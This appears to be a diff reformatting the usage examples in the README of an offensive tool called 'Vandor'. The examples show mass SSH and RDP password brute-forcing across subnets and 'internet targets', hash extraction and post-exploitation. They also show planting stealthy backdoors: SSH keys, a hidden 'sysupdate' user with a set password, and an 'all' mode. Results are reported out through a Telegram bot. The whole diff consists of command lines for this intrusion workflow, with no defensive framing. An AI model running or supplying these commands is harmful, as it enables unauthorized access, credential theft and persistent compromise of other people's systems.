@@ -101,8 +101,7 @@ Vandor -targets 192.168.1.100 -users root -passwords admin123
 Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
 
 # Fast SSH cracking with custom threads
-Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt \
-  -crack-threads 10000 -crack-timeout 5
+Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt -crack-threads 10000 -crack-timeout 5
 
 # CIDR network
 Vandor -targets 192.168.1.0/24 -users admin -passwords admin123
@@ -118,8 +117,7 @@ Vandor -targets 10.0.0.5:2222 -users root -passwords pass.txt
 Vandor -targets 10.0.0.5 -protocol rdp -users admin -passwords pass.txt
 
 # Fast RDP cracking
-Vandor -targets hosts.txt -users admin -passwords pass.txt \
-  -protocol rdp -crack-threads 8000 -crack-timeout 8
+Vandor -targets hosts.txt -users admin -passwords pass.txt -protocol rdp -crack-threads 8000 -crack-timeout 8
 ```
 
 ### Archive Cracking
@@ -136,12 +134,10 @@ Vandor -zip archive.zip -zip-dict rockyou.txt
 
 ```bash
 # With backdoor installation
-Vandor -targets 10.0.0.5 -users root -passwords pass.txt \
-  -backdoor -backdoor-type ssh-key
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt -backdoor -backdoor-type ssh-key
 
 # All backdoor types
-Vandor -targets 10.0.0.5 -users root -passwords pass.txt \
-  -backdoor -backdoor-type all
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt -backdoor -backdoor-type all
 
 # Gather system info
 Vandor -targets 10.0.0.5 -users root -passwords pass.txt -post-exploit
@@ -153,8 +149,7 @@ Vandor -targets 10.0.0.5 -users root -passwords pass.txt -extract-hash
 ### Telegram Notifications
 
 ```bash
-Vandor -targets targets.txt -users users.txt -passwords pass.txt \
-  -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
+Vandor -targets targets.txt -users users.txt -passwords pass.txt -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
 ```
 
 ---
@@ -353,17 +348,13 @@ Vandor -zip protected.zip -zip-dict rockyou.txt -zip-workers 1000
 
 ```bash
 # SSH Key Backdoor (Most Stealthy)
-Vandor -targets target.com -users root -passwords pass.txt \
-  -backdoor -backdoor-type ssh-key
+Vandor -targets target.com -users root -passwords pass.txt -backdoor -backdoor-type ssh-key
 
 # Hidden User Backdoor
-Vandor -targets target.com -users root -passwords pass.txt \
-  -backdoor -backdoor-type hidden-user \
-  -backdoor-user sysupdate -backdoor-pass "P@ssw0rd123!"
+Vandor -targets target.com -users root -passwords pass.txt -backdoor -backdoor-type hidden-user -backdoor-user sysupdate -backdoor-pass "P@ssw0rd123!"
 
 # Deploy Everything
-Vandor -targets target.com -users root -passwords pass.txt \
-  -backdoor -backdoor-type all -backdoor-port 22222
+Vandor -targets target.com -users root -passwords pass.txt -backdoor -backdoor-type all -backdoor-port 22222
 ```
 
 ---
@@ -371,8 +362,7 @@ Vandor -targets target.com -users root -passwords pass.txt \
 ## 📱 Telegram Notifications
 
 ```bash
-Vandor -targets targets.txt -users users.txt -passwords pass.txt \
-  -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
+Vandor -targets targets.txt -users users.txt -passwords pass.txt -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
 ```
 
 | Mode | Description |
@@ -424,16 +414,13 @@ Vandor -targets targets.txt -users users.txt -passwords pass.txt \
 
 ```bash
 # Fast port scan + fast cracking
-Vandor -targets 192.168.1.0/24 -ps 22,3389 -ps-threads 10000 -ps-timeout 30 \
-  -users root -passwords rockyou.txt -crack-threads 15000 -crack-timeout 5
+Vandor -targets 192.168.1.0/24 -ps 22,3389 -ps-threads 10000 -ps-timeout 30 -users root -passwords rockyou.txt -crack-threads 15000 -crack-timeout 5
 
 # Ultra fast for local network
-Vandor -targets 192.168.1.0/24 -ps -ps-threads 20000 -ps-timeout 20 \
-  -users users.txt -passwords pass.txt -crack-threads 20000 -crack-timeout 3
+Vandor -targets 192.168.1.0/24 -ps -ps-threads 20000 -ps-timeout 20 -users users.txt -passwords pass.txt -crack-threads 20000 -crack-timeout 3
 
 # Conservative for internet targets
-Vandor -targets targets.txt -users users.txt -passwords pass.txt \
-  -crack-threads 5000 -crack-timeout 15
+Vandor -targets targets.txt -users users.txt -passwords pass.txt -crack-threads 5000 -crack-timeout 15
 ```
 
 ---
@@ -584,13 +571,7 @@ Vandor -targets targets.txt -users users.txt -passwords pass.txt \
 
 ```bash
 # Full post-exploitation with all features
-Vandor -targets target.com -users root -passwords pass.txt \
-  -post-exploit \
-  -extract-hash \
-  -scan-network \
-  -gen-script \
-  -backdoor -backdoor-type all \
-  -bot-token "TOKEN" -chat-id "ID" -notify 1
+Vandor -targets target.com -users root -passwords pass.txt -post-exploit -extract-hash -scan-network -gen-script -backdoor -backdoor-type all -bot-token "TOKEN" -chat-id "ID" -notify 1
 
 # Extract hashes only
 Vandor -targets target.com -users root -passwords pass.txt -extract-hash
@@ -622,8 +603,7 @@ Vandor -targets target.com -users root -passwords pass.txt -multi-city -post-exp
 Vandor -targets hosts.txt -users users.txt -passwords pass.txt -monitor
 
 # With performance tuning
-Vandor -targets hosts.txt -users users.txt -passwords pass.txt \
-  -monitor -crack-threads 10000 -crack-timeout 5
+Vandor -targets hosts.txt -users users.txt -passwords pass.txt -monitor -crack-threads 10000 -crack-timeout 5
 ```
 
 ### JSON/CSV Export
